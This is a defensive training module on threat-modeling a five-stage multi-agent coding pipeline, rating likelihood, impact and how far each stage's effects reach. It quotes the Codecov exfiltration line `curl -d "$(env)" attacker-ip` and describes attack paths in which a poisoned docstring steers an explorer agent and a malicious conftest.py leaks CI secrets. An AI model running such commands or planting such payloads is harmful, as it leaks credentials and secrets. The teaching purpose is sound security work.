# Day 2 · Module 1: Threat Model

**Objective:** build a practical threat model for a multi-agent pipeline so you can answer, clearly and quickly: **"How could this get hacked, and what control would have stopped it?"**

You will rate each stage risk by likelihood × impact, map it to a control requirement, and produce a prioritized hardening backlog. The core lesson is transitive reach: an agent can do more damage than its stage name suggests because of what that stage can trigger downstream.

## Relevant Claude Code Docs
Review these before starting the module:
- [Security](https://code.claude.com/docs/en/security)
- [How Claude Code works](https://code.claude.com/docs/en/how-claude-code-works)
- [Choose a sandbox environment](https://code.claude.com/docs/en/sandbox-environments)
- [Configure permissions](https://code.claude.com/docs/en/permissions)

## 1 · The idea

A threat model for an agentic pipeline is a table: one row per stage, per capability that stage has.

For each row, do three things:
1. Rate likelihood
2. Rate impact
3. Route to a control with this heuristic:

> **impossible → prevent · needs a human → gate · only observable after → detect · tolerable → accept**

Choose the leftmost control that is actually feasible. Only move right when the control on the left is truly impossible.

Why this is not a paperwork exercise:
- It turns vague worry ("AI might do something weird") into concrete attack paths.
- It gives you a specific engineering decision per risk row.
- It helps you justify security work in plain language to non-security teammates.

"Prevent" means the bad action is structurally impossible, not that the model was politely instructed not to do it.

Most rows are straightforward once you list what each stage can literally do. The hard part, and the point of this module, is **transitive reach**: a stage's capability often grants more power than its stated action implies.

### Why teams get surprised (first-time builder view)

New agent teams often secure the obvious step and miss the hidden one:

- "The tester only runs tests" → but test collection imports Python and can execute code before assertions.
- "The explorer only reads code" → but poisoned comments/docstrings can become trusted instructions.
- "The synthesizer only summarizes" → but if it trusts upstream artifacts blindly, one poisoned artifact can steer final decisions.

A useful threat model forces you to write this chain out explicitly:

**attacker input → stage behavior → transitive reach → business impact → control that would have blocked it**

If you can explain that chain in one minute, your model is doing real work.

### Grounding & real-world context

This pipeline teaches vulnerability patterns from a real 2024 supply-chain attack: a CI runner was compromised via malicious code in a test fixture. The attacker injected code into `tests/conftest.py`, which ran during pytest's collection phase (before any assertion), and exfiltrated deployment credentials from the runner's environment.

The three transitive-reach patterns we model here map to real attack shapes:
1. **Tester/pytest import-time execution** — code in `tests/` runs before assertions
2. **Explorer/docstring injection** — a poisoned comment becomes trusted instruction
3. **Synthesizer/artifact trust** — downstream stage believes upstream output

ContosoBank's Day 1 capstone pipeline has five stages: explorer, implementer, tester, critic, synthesizer, run against the transfers / ledger / holds feature set. Read the full description of each stage's tools, untrusted inputs, and reach at `reference/day2/m1/pipeline.md` — that reference includes real-world payload examples and threat rating scales.

### Real-world transitive reach — four supply-chain attacks

Before you build your own threat model, study how transitive reach showed up in four documented attacks. Each row below shows:
- **What the stage's stated action was** (build, read, approve, run)
- **What its transitive reach actually was** (compromised all customers, leaked all secrets, infected critical services)

#### 1. SolarWinds / SUNBURST (2020) — Build → Binary poisoning
- **Stage:** Build system
- **Stated action:** Compile source, create binary, sign with private key
- **Transitive reach:** Code injected at compile time (not in source control), deleted post-build, shipped in signed binary. ~18,000 customers pulled trojanized Orion updates. Build access reached transitively to **all downstream customers**.

#### 2. XZ Utils Backdoor (CVE-2024-3094, March 2024) — Maintainer → Transitive dependency chain
- **Stage:** Source maintainer
- **Stated action:** Approve commits, maintain the liblzma library
- **Transitive reach:** Backdoor embedded in binary test files (invisible in source diffs). When sshd links to systemd, which links to liblzma, the backdoor loaded into SSH. One library compromise reached transitively into **critical services that never directly depended on it**.

#### 3. 3CX Installers (March 2023) — Developer account → Global artifact poisoning
- **Stage:** Developer with build-system access
- **Stated action:** Build and sign installers
- **Transitive reach:** One compromised account poisoned both Windows and macOS builds. Signed with legitimate 3CX certificates. Reached transitively to **all customers trusting 3CX's signature**.

#### 4. Codecov Bash Uploader (April 2021) — Tool reads environment, exfiltrates
- **Stage:** CI tool (reads env to configure itself)
- **Stated action:** Read environment variables for API keys, repo identity
- **Transitive reach:** Malicious line added: `curl -d "$(env)" attacker-ip`. Tool read environment *and exfiltrated it*. For 61 days, 23,000+ customers leaked **all secrets in their build environment**.

**Core principle:** Each stage's stated action (build, approve, read, sign) understates its transitive reach (affects all customers, all dependent services, all secrets in the environment).

When you threat-model, don't just list what each stage's tools *say they do*. Ask: where does this stage's reach **actually go**, once you follow the chain?

### A fully-rated worked row

Before you fill in your own table, walk through one row rated end to end. This is the tester/pytest mechanism from the grounding above, rated and routed through the heuristic:

| Stage | Capability | Likelihood | Impact | Control |
|---|---|---|---|---|
| Tester | `uv run pytest` collection imports `tests/` (`conftest.py` first, then each test module) as Python code → arbitrary import-time execution | High — any file under `tests/` runs at collection time; there is no review gate on test code before the tester's turn | High — runs with the tester's full reach: ledger, filesystem, network | **prevent** |

**Attack path in plain English:**
1. Implementer writes a malicious `tests/conftest.py`.
2. Tester runs pytest.
3. Pytest imports `conftest.py` before tests.
4. Payload executes and exfiltrates secrets.
5. Team sees "tests failed" but the leak already happened.

**Walk the heuristic aloud, in order:** can this be made impossible?
Yes: run collection in a network-blocked sandbox and enforce a policy forbidding import-time side effects in `tests/`. That makes this exploit path structurally unavailable.

Because "impossible" is reachable, the row stops at **prevent**. It does not fall through to gate or detect.

A weak control here is detect-only ("we'll catch unusual traffic in logs"). Detection is useful, but after exfiltration it is incident response, not prevention.

### Setup check

Run the cell below once per session. It makes sure `contoso` is importable and prints the resolved project root — you'll need `proj` later for the self-check.


In [ ]:
import subprocess, sys, os
# Ensure src is importable and the sandbox is healthy before you start.
os.chdir(os.path.dirname(os.getcwd())) if os.path.basename(os.getcwd()) in ("day1","day2") else None
root = subprocess.run(["git","rev-parse","--show-toplevel"], capture_output=True, text=True)
proj = root.stdout.strip() or os.path.abspath(os.path.join(os.getcwd(), "..", ".."))
sys.path.insert(0, os.path.join(proj, "src"))
print("project root:", proj)
try:
    import contoso
    print("contoso imported OK:", contoso.__name__)
except Exception as e:
    print("Could not import contoso:", e)
    print("Run `uv sync` in the repo root, then restart the kernel.")

## 2 · Your exercise

Work through these steps in order:

1. Read `reference/day2/m1/pipeline.md` in full. It describes all five stages' tools, untrusted inputs, and reach. Do not threat-model from memory of Day 1.
2. Fill in `templates/threat-model.md`: one row per stage × capability. For each row, rate likelihood and impact, then route it with the heuristic.
3. For each top risk, add a one-line exploit chain: **attacker input → stage behavior → transitive reach → impact**.
4. Name at least one transitive-reach risk beyond the tester/pytest row (explorer docstring poisoning is one candidate; synthesizer trust of upstream artifacts is another).
5. Extract a top-5 **ordered** hardening backlog sorted by **likelihood × impact × ease-of-mitigation**.
6. For each backlog item, add one sentence: "If we do not fix this, the likely business outcome is ..."

Write the completed table plus the backlog to `artifacts/day2/m1/threat-model.md`.

### Threat rating scales

Use these scales to rate likelihood and impact for each row:

**Likelihood:** How often does this stage run, and can the attacker influence the untrusted input?
- **High (9-10):** Stage runs on every pipeline execution; attacker controls files (e.g., implementer writes to `src/` and `tests/`)
- **Medium (5-8):** Stage runs regularly but attacker influence requires a specific code path or commit (e.g., explorer reads a docstring only if that module is touched)
- **Low (1-4):** Stage runs infrequently, or attacker control is hypothetical (e.g., requires multiple prior compromises)

**Impact:** What reach does this stage have if compromised?
- **High (9-10):** Network access, filesystem access, environment variables with credentials, ability to exfiltrate data or ship code to production
- **Medium (5-8):** Can delay/block features, pollute logs, read protected codebase sections, create noise in artifacts
- **Low (1-4):** Cosmetic changes, noise, information already public

**Examples from the reference:**
- Tester running `conftest.py` payload: Likelihood = High (implementer controls `tests/`), Impact = High (runs with CI env vars)
- Explorer reading poisoned docstring: Likelihood = Medium (docstring must exist and be read), Impact = High (if downstream stage executes the injected instruction)

### What good looks like

A strong threat model:
- Covers at least 4 of the 5 pipeline stages.
- Names transitive reach concretely (mechanism + where reach expands), not just stage labels.
- Includes at least one row that correctly lands on **prevent** via the heuristic.
- Ends with a real top-5 backlog ordered by likelihood × impact × ease-of-mitigation.
- Includes a plain-language business outcome for each top backlog item.

If a product manager or engineering manager can read your output and understand:
1. how an attack would happen,
2. what gets hurt,
3. what control would block it first,
then your model is practical.

Common failure modes:
- Modeling only direct stage actions and ignoring transitive effects.
- Defaulting every row to detect because it feels safer than making a hard prevention call.
- Sorting by likelihood × impact only, which hides cheap high-value mitigations.
- Listing backlog items without a clear ordering rule or business consequence.

### Verify your work

This checklist is advisory, not a gate — it just reflects back what it finds in `artifacts/day2/m1/`. Run it any time; it's safe to run before you've written anything.


In [ ]:
import pathlib
tm = pathlib.Path(proj) / "artifacts" / "day2" / "m1" / "threat-model.md"
if tm.exists():
    t = tm.read_text().lower()
    print(f"[x] threat-model.md present ({len(t.split())} words)")
    stages = [s for s in ("explorer","implementer","tester","critic","synthesizer") if s in t]
    print(f"  [{'x' if len(stages) >= 4 else ' '}] covers >=4/5 stages ({len(stages)}/5)")
    print(f"  [{'x' if 'transitive' in t or 'imports' in t or 'via the tester' in t or 'arbitrary code' in t or 'conftest' in t else ' '}] names transitive reach (conftest.py / pytest collection, or the explorer's docstring)?")
    print(f"  [{'x' if 'prevent' in t else ' '}] uses a 'prevent' control rating?")
    print(f"  [{'x' if 'ease' in t or 'ease-of-mitigation' in t or 'backlog' in t else ' '}] has an ordered hardening backlog (L x I x ease-of-mitigation)?")
    print(f"  [{'x' if 'business outcome' in t or 'if we do not fix' in t or 'customer impact' in t else ' '}] includes plain-language business outcomes for top risks?")
else:
    print("[ ] artifacts/day2/m1/threat-model.md missing — fill it from templates/threat-model.md")

## 3 · Debrief

- Where does stage reach exceed stated action in this pipeline? Name at least two concrete chains (for example: pytest collection import path, explorer docstring poisoning, synthesizer artifact trust).
- Which rows must be prevented versus gated or detected? Pick one disputed row and run the heuristic aloud from left to right.
- Which backlog item moved up because it was cheap to mitigate, not because it had the highest raw severity?
- If this pipeline shipped tomorrow, which single unmitigated row would you lose sleep over, and why?

If your answers feel uncomfortable and specific, that is success: you are now doing threat modeling instead of compliance theater.

---
### Take-home

Rating a stage by its stated action alone understates its real risk. The transitive-reach lesson generalizes: whenever one stage's output becomes another stage's input — especially code that gets imported, executed, or otherwise interpreted — the reach of the earlier stage is really the reach of whatever the later stage's own capability set allows.

(Related concept: permissions turn a "prevent" row into an enforced control, rather than a documented intention.)
